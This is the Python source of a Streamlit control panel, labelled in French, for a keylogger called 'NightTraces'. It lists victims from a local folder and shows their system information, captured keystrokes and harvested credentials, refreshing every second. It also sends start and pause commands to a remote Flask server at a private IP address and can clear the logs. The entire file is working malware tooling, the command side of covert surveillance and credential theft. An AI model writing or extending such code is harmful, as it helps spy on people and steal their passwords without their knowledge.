import streamlit as st
import os
import json
import requests
import pandas as pd
import time

# -------------------------------------------------
#               CONFIGURATION
# -------------------------------------------------
st.set_page_config(
    page_title="NightTraces",
    layout="wide"
)

# -------------------------------------------------
#                STYLE PREMIUM SHADOW
# -------------------------------------------------
st.markdown("""
<style>
body, .block-container {
    background: #101019;
    color: #f0f0f0;
    font-family: 'Segoe UI', sans-serif;
}

/* TOPBAR */
.topbar {
    width: 100%;
    background: #12122a;
    padding: 15px 25px;
    display: flex;
    justify-content: space-between;
    align-items: center;
    border-bottom: 1px solid #0a84ff;
    position: sticky;
    top: 0;
    z-index: 9999;
    box-shadow: 0 3px 15px rgba(0,0,0,0.5);
    margin-bottom: 20px;
}
.topbar h1 {
    color: #0a84ff;
    margin: 0;
    font-size: 28px;
    font-weight: 700;
}

/* CARD */
.card {
    background-color: #14141f;
    border-radius: 12px;
    padding: 20px;
    margin-bottom: 20px;
    border: 1px solid #222;
    box-shadow: 0 8px 20px rgba(0,0,0,0.4);
}

/* SELECTBOX */
div[data-baseweb="select"] > div {
    background-color: #1b1b2c !important;
    color: #f0f0f0 !important;
    border: 1px solid #0a84ff !important;
    border-radius: 6px;
}

/* BUTTONS */
.stButton>button {
    background-color: #0a84ff !important;
    color: white !important;
    border-radius: 8px;
    border: none;
    padding: 0.6rem 1rem;
    font-weight: 600;
    transition: 0.2s;
}
.stButton>button:hover {
    background-color: #006edc !important;
}

/* DATAFRAME */
.dataframe, th, td {
    background-color: #14141f !important;
    color: #f0f0f0 !important;
}
th {
    background-color: #1f1f2f !important;
    color: #0a84ff !important;
    padding: 10px !important;
}
td {
    padding: 8px !important;
}

/* HEADERS */
h2 {
    color: #0a84ff !important;
    margin-bottom: 15px;
}
</style>
""", unsafe_allow_html=True)

# -------------------------------------------------
#               TOPBAR & VICTIME
# -------------------------------------------------
st.markdown('<div class="topbar">', unsafe_allow_html=True)
st.markdown('<h1>🌙 NightTraces</h1>', unsafe_allow_html=True)

BASE_DIR = "./victims"

def get_victim_list():
    victims = []
    if not os.path.exists(BASE_DIR):
        return victims
    for v_id in os.listdir(BASE_DIR):
        path = os.path.join(BASE_DIR, v_id)
        if not os.path.isdir(path):
            continue
        info_file = os.path.join(path, "info.json")
        username = "unknown"
        if os.path.exists(info_file):
            try:
                with open(info_file, "r") as f:
                    info = json.load(f)
                username = info.get("username", "unknown")
            except:
                pass
        display_name = f"{username} ({v_id})"
        victims.append((display_name, v_id))
    return victims

victim_list = get_victim_list()
if len(victim_list) == 0:
    st.error("Aucune victime détectée")
    st.stop()

display_names = [v[0] for v in victim_list]
victim_ids = {v[0]: v[1] for v in victim_list}

selected_display = st.selectbox("Sélectionner une victime", display_names)
victim = victim_ids[selected_display]

st.markdown('</div>', unsafe_allow_html=True)

victim_dir = os.path.join(BASE_DIR, victim)
info_file = os.path.join(victim_dir, "info.json")
concat_file = os.path.join(victim_dir, "concat.json")
creds_file = os.path.join(victim_dir, "credentials.json")

# -------------------------------------------------
#               CONTROL BUTTONS
# -------------------------------------------------
st.markdown('<div class="card">', unsafe_allow_html=True)
st.subheader("🎛️ Contrôle du keylogger")

def send_action(action):
    try:
        requests.post(f"http://192.168.50.10:5000/{action}")
        st.success(f"Action envoyée : {action.upper()}")
    except:
        st.error("Impossible de contacter le serveur Flask")

def clear_logs():
    try:
        open(concat_file, "w").close()
        open(creds_file, "w").close()
        st.success("Logs effacés avec succès !")
    except:
        st.error("Impossible d'effacer les logs.")

col1, col2, col3 = st.columns(3)
with col1:
    if st.button("▶️ Start"):
        send_action("start")
with col2:
    if st.button("⏸️ Pause"):
        send_action("pause")
with col3:
    if st.button("🗑️ Clear Logs"):
        clear_logs()

st.markdown('</div>', unsafe_allow_html=True)

# -------------------------------------------------
#                 SYSTEM INFO
# -------------------------------------------------
st.markdown('<div class="card">', unsafe_allow_html=True)
st.subheader("🧑 Informations système")
if os.path.exists(info_file):
    with open(info_file, "r") as f:
        info = json.load(f)
    st.json(info)
else:
    st.info("En attente des informations…")
st.markdown('</div>', unsafe_allow_html=True)

# -------------------------------------------------
#                 LOGS & CREDENTIALS
# -------------------------------------------------
def read_jsonl(path):
    entries = []
    if os.path.exists(path):
        with open(path, "r") as f:
            for line in f:
                try:
                    entries.append(json.loads(line))
                except:
                    pass
    return entries

log_area = st.empty()
cred_area = st.empty()

# -------------------------------------------------
#           STREAMING / SILENT REFRESH
# -------------------------------------------------
while True:
    logs = read_jsonl(concat_file)
    creds = read_jsonl(creds_file)

    # Logs table
    with log_area.container():
        st.markdown('<div class="card">', unsafe_allow_html=True)
        st.subheader("📝 Logs capturés")
        if len(logs) == 0:
            st.warning("Aucun log pour le moment…")
        else:
            df_logs = pd.DataFrame({
                "Date": [e["timestamp"] for e in logs[-200:]],
                "Texte": [e["text"] for e in logs[-200:]],
            })
            st.dataframe(df_logs, use_container_width=True, hide_index=True)
        st.markdown('</div>', unsafe_allow_html=True)

    # Credentials table
    with cred_area.container():
        st.markdown('<div class="card">', unsafe_allow_html=True)
        st.subheader("🔐 Credentials détectés")
        if len(creds) == 0:
            st.info("Aucun credential détecté.")
        else:
            df_creds = pd.DataFrame({
                "Date": [e["timestamp"] for e in creds],
                "Valeur": [e["text"] for e in creds],
            })
            st.dataframe(df_creds, use_container_width=True, hide_index=True)
        st.markdown('</div>', unsafe_allow_html=True)

    time.sleep(1)
